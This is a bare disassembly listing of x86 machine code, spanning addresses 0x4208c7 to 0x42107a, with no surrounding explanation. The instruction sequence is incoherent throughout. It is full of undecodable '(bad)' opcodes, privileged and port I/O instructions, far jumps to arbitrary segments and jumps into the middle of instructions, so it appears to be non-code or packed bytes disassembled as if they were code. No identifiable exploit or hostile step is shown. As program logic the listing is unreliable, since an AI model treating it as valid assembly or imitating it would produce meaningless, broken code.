  4208c7:	ds (bad) 
  4208c9:	arpl   di,bx
  4208cb:	and    eax,0xb69a1122
  4208d0:	stos   BYTE PTR es:[edi],al
  4208d1:	cmp    al,0x3f
  4208d3:	jmp    DWORD PTR [ebp+eax*2+0x46]
  4208d7:	retf   
  4208d8:	push   edx
  4208d9:	lods   al,BYTE PTR ds:[esi]
  4208da:	mov    BYTE PTR [ebp+0x22ec7d14],bl
  4208e0:	fiadd  WORD PTR [ebp+0x6ec8ec2b]
  4208e6:	fist   WORD PTR [ecx+0x4d]
  4208e9:	dec    eax
  4208ea:	jo     0x42096a
  4208ec:	sahf   
  4208ed:	dec    ecx
  4208ee:	push   ecx
  4208ef:	adc    eax,0xdb39c26f
  4208f4:	adc    bh,cl
  4208f6:	bnd js 0x4208bc
  4208f9:	mov    BYTE PTR [ebx],ch
  4208fb:	cmp    dl,bl
  4208fd:	jecxz  0x420900
  4208ff:	inc    esi
  420900:	into   
  420901:	fcomp  DWORD PTR [esi+0x1a5c307c]
  420907:	shl    cl,1
  420909:	in     eax,0x8
  42090b:	or     ecx,ebp
  42090d:	ror    BYTE PTR [edi-0x38],0xab
  420911:	imul   DWORD PTR [ebx-0x29913e07]
  420917:	fs inc esi
  420919:	pop    edi
  42091a:	cwde   
  42091b:	and    DWORD PTR [edx],ebx
  42091d:	jae    0x42094f
  42091f:	push   esi
  420920:	scas   al,BYTE PTR es:[edi]
  420921:	std    
  420922:	sub    al,0x32
  420924:	push   esp
  420925:	ss mov cl,0x80
  420928:	inc    ebx
  420929:	mov    ch,0xbb
  42092b:	iret   
  42092c:	sub    dh,0x60
  42092f:	xchg   ebp,eax
  420930:	xor    DWORD PTR [ecx-0x7e],0x2cca68fc
  420937:	pusha  
  420938:	mov    edi,0xe60a979
  42093d:	dec    esp
  42093e:	(bad)  
  42093f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420940:	jno    0x4209a9
  420942:	push   0x69d0531a
  420947:	xchg   ecx,eax
  420948:	retf   
  420949:	cmp    al,0xf5
  42094b:	pop    edi
  42094c:	xchg   ebp,eax
  42094d:	inc    esp
  42094e:	(bad)  
  42094f:	retf   0x9427
  420952:	repz loope 0x420947
  420955:	mov    dl,BYTE PTR [ebp-0x8]
  420958:	jmp    0x420983
  42095a:	add    al,0x5e
  42095c:	bound  edi,QWORD PTR [ebx]
  42095e:	mov    ch,0xae
  420960:	mov    al,0x2a
  420962:	jg     0x420915
  420964:	xchg   edi,eax
  420965:	xor    al,0xb6
  420967:	jecxz  0x42095d
  420969:	cmp    eax,0xef6848be
  42096e:	pop    eax
  42096f:	test   eax,0x798f7b55
  420974:	or     eax,DWORD PTR [edi+esi*2]
  420977:	inc    eax
  420978:	add    BYTE PTR [eax-0x16],bl
  42097b:	mov    DWORD PTR [ecx+0x5f],eax
  42097e:	daa    
  42097f:	mov    cl,0x6d
  420981:	and    BYTE PTR [eax-0x56c70131],al
  420987:	mov    eax,ds:0x2aa23270
  42098c:	js     0x420932
  42098e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42098f:	scas   al,BYTE PTR es:[edi]
  420990:	popa   
  420991:	mov    al,ds:0x86f235b6
  420996:	xlat   BYTE PTR ds:[ebx]
  420997:	ret    0xc2ae
  42099a:	push   0x61550d0
  42099f:	rcr    BYTE PTR [edx],1
  4209a1:	push   ecx
  4209a2:	dec    ecx
  4209a3:	loope  0x420980
  4209a5:	push   0xa6c1053b
  4209aa:	fwait
  4209ab:	mov    esp,0x28f2b087
  4209b0:	mov    dl,0xdb
  4209b2:	scas   eax,DWORD PTR es:[edi]
  4209b3:	xor    DWORD PTR [eax],esi
  4209b5:	jp     0x4209d4
  4209b7:	ds lock pop eax
  4209ba:	adc    DWORD PTR [edx-0x66d4175b],ecx
  4209c0:	std    
  4209c1:	data16 fwait
  4209c3:	push   cs
  4209c4:	popa   
  4209c5:	xchg   ecx,eax
  4209c6:	mov    esp,DWORD PTR [ebx-0x6d304aac]
  4209cc:	add    DWORD PTR [eax],ecx
  4209ce:	add    DWORD PTR [esi+0x7eb8ebe6],ebp
  4209d4:	clc    
  4209d5:	lods   al,BYTE PTR ds:[esi]
  4209d6:	mov    ebp,0x8c6e1b33
  4209db:	retf   
  4209dc:	sbb    BYTE PTR [ecx-0x3c],0x9a
  4209e0:	mov    ah,0xf4
  4209e2:	(bad)  
  4209e3:	jle    0x420a32
  4209e5:	loop   0x420a4b
  4209e7:	xrelease lock adc BYTE PTR [ecx-0x68],ch
  4209ec:	jns    0x420a51
  4209ee:	cli    
  4209ef:	adc    BYTE PTR [esi+0x4c],dh
  4209f2:	test   BYTE PTR [edi+0x52],dh
  4209f5:	inc    esp
  4209f6:	mov    ds:0xc0cb74cd,eax
  4209fb:	sub    ecx,DWORD PTR ds:[esi]
  4209fe:	aam    0xec
  420a00:	jo     0x4209cf
  420a02:	jno    0x4209b5
  420a04:	add    al,0x16
  420a06:	test   BYTE PTR [edx+0x488f84ff],0x8a
  420a0d:	xor    dh,BYTE PTR [eax-0x5]
  420a10:	into   
  420a11:	or     edi,DWORD PTR [edi+0x1c]
  420a14:	arpl   WORD PTR [ecx+0x1f],bx
  420a17:	mov    bl,0x30
  420a19:	shl    ebp,cl
  420a1b:	add    al,0xc7
  420a1d:	cmp    eax,0x8102f7f
  420a22:	les    edx,FWORD PTR [edi+0x42]
  420a25:	jb     0x420a0a
  420a27:	dec    eax
  420a28:	inc    edi
  420a29:	cmp    al,BYTE PTR [ecx+0x133dddae]
  420a2f:	cmp    al,0x29
  420a31:	adc    al,0xc
  420a33:	test   DWORD PTR [ecx],ecx
  420a35:	mov    es,WORD PTR [edi+0x57f463c7]
  420a3b:	call   0xee55:0xb3581c6a
  420a42:	inc    esi
  420a43:	sbb    cl,BYTE PTR [edx+eiz*2+0x76]
  420a47:	leave  
  420a48:	lahf   
  420a49:	into   
  420a4a:	dec    esp
  420a4b:	(bad)  
  420a4c:	dec    esi
  420a4d:	mov    ebx,DWORD PTR [ecx+0x20c83792]
  420a53:	adc    BYTE PTR [eax],bh
  420a55:	popa   
  420a56:	or     al,0xe5
  420a58:	retf   
  420a59:	leave  
  420a5a:	push   es
  420a5b:	sar    DWORD PTR [ebp+ebx*8+0x4d],cl
  420a5f:	mov    esi,0xeaedb11a
  420a64:	fist   WORD PTR [esi]
  420a66:	and    al,0x6a
  420a68:	dec    ecx
  420a69:	(bad)  
  420a6a:	xor    ah,BYTE PTR [ebx-0x2e7f1019]
  420a70:	and    dh,BYTE PTR ds:0xf97fc9ff
  420a76:	(bad)  
  420a77:	adc    dh,bl
  420a79:	xchg   BYTE PTR [ebx],ah
  420a7b:	sub    eax,0xc503ebda
  420a80:	xchg   ecx,eax
  420a81:	mov    bh,0x81
  420a83:	adc    edi,esp
  420a85:	pop    esp
  420a86:	shl    dh,cl
  420a88:	cmp    esi,DWORD PTR ds:0xc3b947a0
  420a8e:	add    BYTE PTR [ebp-0x47],bl
  420a91:	jecxz  0x420b0a
  420a93:	cmp    ch,BYTE PTR [edx-0x6d5e8251]
  420a99:	mov    WORD PTR [eax+esi*8-0x4e],ss
  420a9d:	(bad)  
  420a9e:	adc    DWORD PTR ds:0xa2056f82,edx
  420aa4:	adc    DWORD PTR [edx+0x5d6b60a1],0x7a
  420aab:	inc    ebx
  420aac:	mov    ah,0xbf
  420aae:	stc    
  420aaf:	sbb    dl,0x52
  420ab2:	sub    DWORD PTR [ebp-0xc69819a],esi
  420ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ab9:	in     eax,0x6c
  420abb:	xchg   ebp,eax
  420abc:	int3   
  420abd:	pop    eax
  420abe:	push   ebp
  420abf:	adc    BYTE PTR [edx-0x52c635b],0xd7
  420ac6:	sub    eax,0x6c91aafa
  420acb:	mov    ds:0x5eccbb92,al
  420ad0:	imul   edi,DWORD PTR [edi],0xffffff8a
  420ad3:	mov    edi,0x380c8106
  420ad8:	dec    edx
  420ad9:	int    0xce
  420adb:	cdq    
  420adc:	ss add ebp,ebp
  420adf:	lods   eax,DWORD PTR ds:[esi]
  420ae0:	jne    0x420adf
  420ae2:	push   esi
  420ae3:	mov    edi,0xa25009b0
  420ae8:	push   edx
  420ae9:	jae    0x420b63
  420aeb:	and    edi,ecx
  420aed:	add    bh,al
  420aef:	in     al,0x8d
  420af1:	lods   al,BYTE PTR ds:[esi]
  420af2:	sub    DWORD PTR [ebx-0x467a548a],ebx
  420af8:	scas   eax,DWORD PTR es:[edi]
  420af9:	fst    st(7)
  420afb:	sbb    DWORD PTR [ebx],eax
  420afd:	pop    esp
  420afe:	pop    ds
  420aff:	dec    edi
  420b00:	js     0x420aa4
  420b02:	xchg   ebp,eax
  420b03:	lea    ecx,[esi+0x1]
  420b06:	les    esp,FWORD PTR [eax+edx*1]
  420b09:	mov    WORD PTR [esi-0x3c06c8a0],ds
  420b0f:	and    BYTE PTR [ecx+0x188cc95c],al
  420b15:	rcl    BYTE PTR [esi-0x68],cl
  420b18:	test   BYTE PTR [ebx-0x388191dc],ah
  420b1e:	push   ss
  420b1f:	jae    0x420abe
  420b21:	mov    al,0xe
  420b23:	hlt    
  420b24:	pushf  
  420b25:	das    
  420b26:	cs cs mov al,0xc2
  420b2a:	sahf   
  420b2b:	sbb    eax,0x9480f72
  420b30:	jmp    0xaf710362
  420b35:	hlt    
  420b36:	scas   eax,DWORD PTR es:[edi]
  420b37:	inc    ebx
  420b38:	rcr    DWORD PTR [eax],0x46
  420b3b:	mov    eax,0xc8a93c6c
  420b40:	rcl    al,1
  420b42:	adc    BYTE PTR [edi-0x34b4e800],bh
  420b48:	add    DWORD PTR [edi+0x18],0x188c4e72
  420b4f:	lods   al,BYTE PTR ds:[esi]
  420b50:	pop    esi
  420b51:	data16 sbb ah,0x93
  420b55:	sahf   
  420b56:	shr    DWORD PTR [esi],0x52
  420b59:	cmp    BYTE PTR [edx],0xc2
  420b5c:	cld    
  420b5d:	push   esi
  420b5e:	test   BYTE PTR [ebx+0x1e],bl
  420b61:	jae    0x420afb
  420b63:	xor    edi,DWORD PTR [ebx+0x1f]
  420b66:	pop    ebp
  420b67:	adc    al,0xf
  420b69:	ja     0x420b71
  420b6b:	ret    0xfb3
  420b6e:	mov    ah,0x88
  420b70:	jb     0x420b5e
  420b72:	cmp    al,BYTE PTR [edi]
  420b74:	mov    dh,0xf8
  420b76:	mov    BYTE PTR [ebx],bl
  420b78:	nop
  420b79:	add    edx,DWORD PTR [edi-0x1a4a2ba7]
  420b7f:	sub    bl,BYTE PTR [ecx-0x9ec3737]
  420b85:	xor    BYTE PTR [ecx],ch
  420b87:	mov    esp,0x5aaafcf9
  420b8c:	push   cs
  420b8d:	arpl   WORD PTR [esp+ebp*2-0x3517df90],bx
  420b94:	and    ecx,DWORD PTR [esi+0x53]
  420b97:	popa   
  420b98:	sub    cl,BYTE PTR [esi]
  420b9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b9b:	xor    BYTE PTR [edx+0x549a960b],bl
  420ba1:	outs   dx,DWORD PTR ds:[esi]
  420ba2:	mov    esi,0xa54a9024
  420ba7:	stos   BYTE PTR es:[edi],al
  420ba8:	in     eax,dx
  420ba9:	in     al,0x0
  420bab:	ret    0xb313
  420bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420baf:	mov    ebx,0xdcbcc3e7
  420bb4:	or     edi,DWORD PTR [ecx-0x2303a70e]
  420bba:	mov    edi,0x6b6c35d8
  420bbf:	out    0x1d,eax
  420bc1:	adc    dh,BYTE PTR [ecx]
  420bc3:	mov    ecx,0xe6a86ad2
  420bc8:	cli    
  420bc9:	repnz iret 
  420bcb:	ins    BYTE PTR es:[edi],dx
  420bcc:	add    ebp,edi
  420bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bcf:	shr    esi,cl
  420bd1:	cmc    
  420bd2:	or     ebx,esp
  420bd4:	test   cl,ch
  420bd6:	jecxz  0x420c34
  420bd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd9:	mov    ebx,ebx
  420bdb:	xchg   DWORD PTR [esp+eiz*2],ebp
  420bde:	out    0xe5,eax
  420be0:	std    
  420be1:	js     0x420c4e
  420be3:	jge    0x420c03
  420be5:	add    DWORD PTR [edx],ebx
  420be7:	pop    edx
  420be8:	and    al,0x83
  420bea:	popa   
  420beb:	aad    0x8c
  420bed:	push   0x38
  420bef:	(bad)  
  420bf0:	pmullw mm1,mm6
  420bf3:	loope  0x420baa
  420bf5:	adc    DWORD PTR [eax+0x2bd32f57],esp
  420bfb:	xchg   edi,ebx
  420bfd:	enter  0x135d,0xb3
  420c01:	mov    ah,0x93
  420c03:	cdq    
  420c04:	lahf   
  420c05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c06:	mov    dl,0xe2
  420c08:	jns    0x420c1a
  420c0a:	ds stos DWORD PTR es:[edi],eax
  420c0c:	repz xchg ebx,ecx
  420c0f:	pop    esp
  420c10:	add    eax,0x8e20ce9d
  420c15:	cmp    BYTE PTR ds:0xf50c472f,0xd0
  420c1c:	dec    edi
  420c1d:	ja     0x420c50
  420c1f:	inc    edi
  420c20:	(bad)  
  420c21:	int3   
  420c22:	fistp  QWORD PTR [ebx]
  420c24:	mov    ds:0xe3fd96b4,al
  420c29:	sbb    eax,0x2aac8357
  420c2e:	cmp    ebx,edi
  420c30:	mov    bl,0x80
  420c32:	fcom   st(2)
  420c34:	xchg   DWORD PTR [edi],esp
  420c36:	fadd   QWORD PTR [ecx]
  420c38:	outs   dx,DWORD PTR ds:[esi]
  420c39:	fcos   
  420c3b:	pop    esp
  420c3c:	pop    esp
  420c3d:	rol    ebx,0xc4
  420c40:	xchg   edi,eax
  420c41:	mov    esi,cs
  420c43:	iret   
  420c44:	int3   
  420c45:	fnsave [ebp+0x66]
  420c48:	mov    bh,0x58
  420c4a:	fidiv  WORD PTR [esi+0x73]
  420c4d:	or     DWORD PTR [ebp-0x66],0x60
  420c51:	shl    DWORD PTR [ecx+eax*4-0x615b8008],0x50
  420c59:	or     ch,BYTE PTR [ecx]
  420c5b:	xchg   esi,eax
  420c5c:	retf   
  420c5d:	bound  eax,QWORD PTR [eax+edi*8]
  420c60:	push   eax
  420c61:	jmp    0xcc86:0xa654dd2
  420c68:	mov    eax,ds:0xbcc0204
  420c6d:	xchg   ebx,eax
  420c6e:	sub    ah,dh
  420c70:	rol    DWORD PTR [eax+0x7a],0x17
  420c74:	sti    
  420c75:	add    DWORD PTR [edx-0x15],ebx
  420c78:	xor    eax,0x800b7e33
  420c7d:	test   DWORD PTR [edx],ecx
  420c7f:	cmpxchg bl,dh
  420c82:	clc    
  420c83:	je     0x420ce7
  420c85:	dec    edx
  420c86:	dec    edx
  420c87:	push   edi
  420c88:	xor    al,0x23
  420c8a:	(bad)  
  420c8b:	xchg   esi,eax
  420c8c:	and    al,0x39
  420c8e:	cmp    ecx,DWORD PTR [edi]
  420c90:	test   al,0x23
  420c92:	dec    edx
  420c93:	pop    esi
  420c94:	mov    eax,esp
  420c96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c97:	sub    ebp,0x3c
  420c9a:	fisttp WORD PTR [ebx]
  420c9c:	jp     0x420c98
  420c9e:	and    al,0xc9
  420ca0:	dec    eax
  420ca1:	gs out dx,eax
  420ca3:	sti    
  420ca4:	cmp    bh,BYTE PTR [ebp-0x376ce47c]
  420caa:	hlt    
  420cab:	add    eax,0xa615386e
  420cb0:	mov    ch,0x6f
  420cb2:	sbb    dl,bl
  420cb4:	adc    ebx,DWORD PTR [eax-0x79bd6d9f]
  420cba:	(bad)  
  420cbb:	add    DWORD PTR [edi+0xa],ebx
  420cbe:	out    dx,al
  420cbf:	xchg   esi,eax
  420cc0:	mov    esp,0x3020e85b
  420cc5:	add    al,ch
  420cc7:	imul   ecx,DWORD PTR [ecx],0x2f
  420cca:	cmp    BYTE PTR [ecx+0x789d394f],cl
  420cd0:	xchg   edi,eax
  420cd1:	loopne 0x420ca0
  420cd3:	pop    eax
  420cd4:	and    al,0xdf
  420cd6:	inc    esp
  420cd7:	xor    edi,DWORD PTR [ebx+0x19]
  420cda:	fnstcw WORD PTR [edi+ecx*4]
  420cdd:	sbb    DWORD PTR [edx-0x22],0x6f
  420ce1:	ins    DWORD PTR es:[edi],dx
  420ce2:	call   0x5a9f:0xd5f28b3c
  420ce9:	sbb    bh,BYTE PTR [ebx+0x28969196]
  420cef:	xchg   edi,eax
  420cf0:	jns    0x420cfd
  420cf2:	in     al,0xb6
  420cf4:	fisttp DWORD PTR [edx]
  420cf6:	add    ebx,esp
  420cf8:	add    eax,0xcb17ee65
  420cfd:	xchg   ebx,eax
  420cfe:	int    0x33
  420d00:	repnz cmp bh,BYTE PTR [ebx]
  420d03:	es lock jae 0x420d5c
  420d07:	loopne 0x420cab
  420d09:	cs pop ss
  420d0b:	(bad)
  420d0f:	xchg   BYTE PTR [edi+eiz*4],bl
  420d12:	aaa    
  420d13:	lods   eax,DWORD PTR ds:[esi]
  420d14:	ja     0x420d70
  420d16:	inc    edx
  420d17:	pop    eax
  420d18:	arpl   WORD PTR [eax-0x4a],di
  420d1b:	push   edx
  420d1c:	std    
  420d1d:	xchg   edx,eax
  420d1e:	xchg   edi,eax
  420d1f:	inc    esi
  420d20:	sti    
  420d21:	add    ah,ah
  420d23:	inc    edx
  420d24:	lds    ecx,FWORD PTR [edi-0x6c]
  420d27:	cmp    eax,esp
  420d29:	sub    al,0xfd
  420d2b:	push   ss
  420d2c:	push   es
  420d2d:	add    eax,0x9fe9ecf5
  420d32:	pop    edx
  420d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d34:	sbb    edi,edi
  420d36:	(bad)  
  420d37:	retf   0x30aa
  420d3a:	add    ecx,DWORD PTR [edi-0x4e8bd9e0]
  420d40:	mov    edx,DWORD PTR [esi]
  420d42:	jns    0x420d68
  420d44:	in     al,dx
  420d45:	pop    ecx
  420d46:	rsqrtps xmm2,xmm4
  420d49:	jecxz  0x420ce4
  420d4b:	fst    st(2)
  420d4d:	aad    0x44
  420d4f:	jo     0x420d68
  420d51:	lock sar edi,1
  420d54:	out    0xcd,al
  420d56:	xor    dh,BYTE PTR [eax+0x521fbbf8]
  420d5c:	xchg   esp,eax
  420d5d:	movd   mm7,DWORD PTR [eax+0x34]
  420d61:	jg     0x420dc4
  420d63:	imul   ebx,DWORD PTR [esi+0x53ecccc6],0x6fbc2f4b
  420d6d:	mov    edx,0x332a557a
  420d72:	xchg   DWORD PTR [eax-0x15],eax
  420d75:	(bad)  
  420d76:	in     eax,dx
  420d77:	push   cs
  420d78:	aas    
  420d79:	push   ss
  420d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d7b:	shl    DWORD PTR [ebx+0x1],cl
  420d7e:	ds daa 
  420d80:	leave  
  420d81:	mov    al,0x8c
  420d83:	cdq    
  420d84:	push   es
  420d85:	push   eax
  420d86:	adc    BYTE PTR [ebx+ecx*1+0x36a88dc0],bl
  420d8d:	test   eax,0x6e2c3175
  420d92:	rol    DWORD PTR [edx+0x50],0xf5
  420d96:	in     al,0x5c
  420d98:	mov    eax,DWORD PTR [edx]
  420d9a:	ret    
  420d9b:	gs xlat BYTE PTR cs:[ebx]
  420d9e:	push   eax
  420d9f:	ins    DWORD PTR es:[edi],dx
  420da0:	push   0xc1457962
  420da5:	mov    ds:0x1ec6ca16,al
  420daa:	je     0x420df5
  420dac:	ret    0x8d02
  420daf:	jmp    0x420db4
  420db1:	cld    
  420db2:	(bad)
  420db6:	int    0x71
  420db8:	nop
  420db9:	inc    ebp
  420dba:	mov    eax,ds:0x16ae1a9f
  420dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dc0:	sub    ebp,DWORD PTR [eax]
  420dc2:	retf   0xb57
  420dc5:	dec    eax
  420dc6:	je     0x420df7
  420dc8:	int    0x87
  420dca:	xor    DWORD PTR [ebp+ecx*2+0x3a],esi
  420dce:	push   ebp
  420dcf:	jmp    0x420e0d
  420dd1:	pop    edi
  420dd2:	pop    ebp
  420dd3:	bound  edi,QWORD PTR [eax+0x6406ce76]
  420dd9:	test   al,0x43
  420ddb:	mov    ebx,0x70529484
  420de0:	fld    TBYTE PTR [eax+0x75]
  420de3:	jl     0x420d69
  420de5:	mov    cs,WORD PTR [ebx-0x3a]
  420de8:	rcr    DWORD PTR [edx],0x74
  420deb:	adc    BYTE PTR [edx+eiz*1-0x3ee073e4],bl
  420df2:	data16 cmp BYTE PTR ss:[eax-0x2b],ch
  420df7:	sub    ecx,DWORD PTR [edi]
  420df9:	je     0x420ddb
  420dfb:	icebp  
  420dfc:	jmp    0xcd80:0x20a142bb
  420e03:	jmp    0x99d0:0xdfd351cd
  420e0a:	ins    DWORD PTR es:[edi],dx
  420e0b:	jne    0x420da5
  420e0d:	addr16 push ds
  420e0f:	jge    0x420e62
  420e11:	mov    bh,0x89
  420e13:	add    BYTE PTR [ecx-0x46],bh
  420e16:	mov    ebx,0x20b0b893
  420e1b:	repz add ch,BYTE PTR ds:[ebp+0x8ce893b]
  420e23:	xchg   DWORD PTR [ecx],ecx
  420e25:	test   eax,0xe032e82b
  420e2a:	sbb    al,0x8e
  420e2c:	xor    BYTE PTR [ebx],ch
  420e2e:	xor    al,0x15
  420e30:	sub    dh,BYTE PTR [ebx]
  420e32:	pop    ecx
  420e33:	add    BYTE PTR [esi+0x57b27ca6],dl
  420e39:	mov    esp,0x309e2141
  420e3e:	jmp    0xcad100ba
  420e43:	lds    ebx,FWORD PTR [ecx+ebp*4-0x6444e5a5]
  420e4a:	call   0xfaaba3df
  420e4f:	(bad)  
  420e50:	mov    dl,0xd
  420e52:	jmp    0x5368:0x71ca1a24
  420e59:	enter  0x124b,0xd0
  420e5d:	mov    ah,bh
  420e5f:	ret    0xd85e
  420e62:	pop    esp
  420e63:	in     eax,0x8d
  420e65:	adc    eax,0xdf0bdfa4
  420e6a:	mov    cl,0x5e
  420e6c:	lea    esp,[eax]
  420e6e:	lods   al,BYTE PTR ds:[esi]
  420e6f:	push   ss
  420e70:	retf   
  420e71:	jnp    0x420e01
  420e73:	test   DWORD PTR [eax-0x4359bb9c],0xbd6cfb7c
  420e7d:	inc    ebx
  420e7e:	scas   eax,DWORD PTR es:[edi]
  420e7f:	ret    
  420e80:	sub    bl,BYTE PTR [esi+ecx*1+0x7c]
  420e84:	inc    edx
  420e85:	mov    ebp,0x6f393f48
  420e8a:	fld    TBYTE PTR [ecx]
  420e8c:	int3   
  420e8d:	pusha  
  420e8e:	pop    ecx
  420e8f:	es hlt 
  420e91:	cmp    al,0xb4
  420e93:	jno    0x420e35
  420e95:	dec    ecx
  420e96:	aad    0xce
  420e98:	sbb    eax,0x3cc8d7eb
  420e9e:	dec    edi
  420e9f:	cli    
  420ea0:	int    0xcd
  420ea2:	pop    ds
  420ea3:	xor    DWORD PTR [ebx+0x413f9366],eax
  420ea9:	and    ebx,DWORD PTR [edx+ebp*8]
  420eac:	fadd   st,st(7)
  420eae:	add    esp,DWORD PTR [ebx-0x1c29707f]
  420eb4:	xor    eax,0x2c26fd73
  420eb9:	cmp    DWORD PTR [edi],ebp
  420ebb:	loope  0x420f10
  420ebd:	(bad)  
  420ebe:	scas   eax,DWORD PTR es:[edi]
  420ebf:	and    BYTE PTR [ebp+0x3e5770d8],0x34
  420ec6:	dec    ebp
  420ec7:	push   edx
  420ec8:	and    DWORD PTR [esi],ecx
  420eca:	data16 aas 
  420ecc:	jge    0x420ea9
  420ece:	pop    ss
  420ecf:	mov    eax,ds:0xc668920b
  420ed4:	adc    edi,DWORD PTR [edx-0x2231824b]
  420eda:	mov    ah,0xfb
  420edc:	nop
  420edd:	scas   al,BYTE PTR es:[edi]
  420ede:	pop    esp
  420edf:	retf   
  420ee0:	std    
  420ee1:	(bad)  
  420ee2:	stos   DWORD PTR es:[edi],eax
  420ee3:	scas   eax,DWORD PTR es:[edi]
  420ee4:	mov    bl,0x3b
  420ee6:	test   ebp,ebp
  420ee8:	mov    esp,0xd8c9d54f
  420eed:	pop    ebp
  420eee:	inc    edi
  420eef:	sub    bl,ah
  420ef1:	call   0x59e:0x18db4137
  420ef8:	stc    
  420ef9:	cmp    DWORD PTR [edi-0x26b08b68],edi
  420eff:	and    eax,0x6647fd1c
  420f04:	mov    eax,ds:0xeab69062
  420f09:	adc    dl,cl
  420f0b:	shl    DWORD PTR [edx],cl
  420f0d:	fst    DWORD PTR [ebx+0x57]
  420f10:	dec    ebx
  420f11:	dec    esi
  420f12:	(bad)  
  420f14:	pop    ebp
  420f15:	push   ecx
  420f16:	xchg   esi,eax
  420f17:	jge    0x420f21
  420f19:	sbb    eax,0xdc11f634
  420f1e:	pop    ebp
  420f1f:	mov    cs,esp
  420f21:	lock and dh,BYTE PTR [ecx+0x4996569]
  420f28:	adc    al,0xfc
  420f2a:	and    bl,BYTE PTR [ebx-0x68]
  420f2d:	out    0xa7,al
  420f2f:	dec    ebx
  420f30:	sbb    DWORD PTR [esi],edi
  420f32:	pop    eax
  420f33:	mov    bl,0xc8
  420f35:	add    al,BYTE PTR [esi+eax*8+0x61988a3d]
  420f3c:	bound  esp,QWORD PTR [eax-0x42e4c311]
  420f42:	shr    BYTE PTR [esi+0x15],0x7f
  420f46:	mov    esi,0x86d2ec65
  420f4b:	cwde   
  420f4c:	mov    WORD PTR [esi-0x2c],gs
  420f4f:	in     al,0xee
  420f51:	dec    esp
  420f52:	inc    edx
  420f53:	or     esi,DWORD PTR [edx-0x128e849d]
  420f59:	jle    0xcc9a23a0
  420f5f:	inc    esi
  420f60:	pop    es
  420f61:	sar    BYTE PTR [edx+edx*4-0x2a],1
  420f65:	(bad)  
  420f67:	ret    0x422e
  420f6a:	loope  0x420f77
  420f6c:	mov    edi,0x4c1f44df
  420f71:	add    eax,edx
  420f73:	adc    eax,0x556f71c8
  420f78:	ins    DWORD PTR es:[edi],dx
  420f79:	out    0x37,eax
  420f7b:	into   
  420f7c:	in     al,dx
  420f7d:	popf   
  420f7e:	bound  edx,QWORD PTR [ecx-0x57]
  420f81:	and    ebx,DWORD PTR [ecx+0x238b28db]
  420f87:	in     eax,0x28
  420f89:	lea    edi,[esi]
  420f8b:	je     0x420fbc
  420f8d:	clc    
  420f8e:	sub    ah,BYTE PTR [edx+0x822e886]
  420f94:	mov    DWORD PTR [edi-0x7a64e85b],edi
  420f9a:	ins    BYTE PTR es:[edi],dx
  420f9b:	fild   QWORD PTR [ecx+0x21]
  420f9e:	sub    ebp,ecx
  420fa0:	cld    
  420fa1:	jne    0x420f41
  420fa3:	jg     0x420f93
  420fa5:	inc    bx
  420fa7:	sbb    dh,BYTE PTR [edx+0x5d07f5dc]
  420fad:	mov    ds:0x131a92fa,eax
  420fb2:	or     al,0x2c
  420fb4:	adc    BYTE PTR [edi+0xb67e8db],0x38
  420fbb:	dec    ecx
  420fbc:	mov    DWORD PTR [ebp+0x31],ebp
  420fbf:	sub    al,0x57
  420fc1:	sub    eax,0x21cf273b
  420fc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fc7:	js     0x420fb0
  420fc9:	mov    edx,0x4b41424c
  420fce:	pop    ds
  420fcf:	jb     0x420fd1
  420fd1:	jo     0x420f92
  420fd3:	pop    ebx
  420fd4:	dec    ecx
  420fd5:	rol    BYTE PTR [eax+0x7a],1
  420fd8:	jl     0x42103e
  420fda:	ins    BYTE PTR es:[edi],dx
  420fdb:	sbb    bh,dl
  420fdd:	xor    eax,0x83ece6fa
  420fe2:	mov    bh,0xdd
  420fe4:	in     eax,dx
  420fe5:	cmp    al,0x67
  420fe7:	mov    dl,0x7a
  420fe9:	call   0xda391c07
  420fee:	xchg   DWORD PTR [ebx-0x39],esi
  420ff1:	aaa    
  420ff2:	out    dx,al
  420ff3:	jbe    0x421058
  420ff5:	dec    edi
  420ff6:	dec    ecx
  420ff7:	aas    
  420ff8:	mov    eax,ds:0x9abe662e
  420ffd:	lock xor eax,0x57ce87d5
  421003:	inc    esi
  421004:	js     0x420fe1
  421006:	ss and ebx,esi
  421009:	jg     0x42102c
  42100b:	xchg   DWORD PTR [ebx+0x2a529e64],esi
  421011:	cwde   
  421012:	pushf  
  421013:	dec    esp
  421014:	mov    bl,0x82
  421016:	imul   ebp,DWORD PTR gs:[esi],0xffffffd2
  42101a:	pop    ecx
  42101b:	mov    ds:0x320d5c88,eax
  421020:	push   ebp
  421021:	and    eax,0xc07cf78
  421026:	mov    cl,0xa0
  421028:	jo     0x420ff5
  42102a:	mov    eax,ds:0x29eb9043
  42102f:	xchg   esi,eax
  421030:	or     al,0xec
  421032:	sub    BYTE PTR [edi+0x61427bea],cl
  421038:	fistp  WORD PTR [eax+ebp*8]
  42103b:	push   ss
  42103c:	sbb    eax,0x6e454d39
  421041:	fwait
  421042:	sub    ch,BYTE PTR [eax-0x77]
  421045:	lock pop ebp
  421047:	outs   dx,DWORD PTR ds:[esi]
  421048:	cld    
  421049:	rol    dh,1
  42104b:	dec    ebp
  42104c:	add    al,0xb6
  42104e:	sbb    DWORD PTR [eax-0x12],eax
  421051:	xlat   BYTE PTR ds:[ebx]
  421052:	pop    eax
  421053:	add    esp,edi
  421055:	lahf   
  421056:	add    eax,eax
  421058:	test   DWORD PTR [ebp-0x4dabf7d6],ecx
  42105e:	test   DWORD PTR [ecx+0x122d2d24],ebx
  421064:	xchg   BYTE PTR [edi],dl
  421066:	jle    0x4210c2
  421068:	mov    esp,0x3bd3d9f2
  42106d:	fwait
  42106e:	dec    ecx
  42106f:	jmp    0xde0468a8
  421074:	xchg   DWORD PTR [esi-0x5cdca119],ebp
  42107a:	cmp    ah,ah
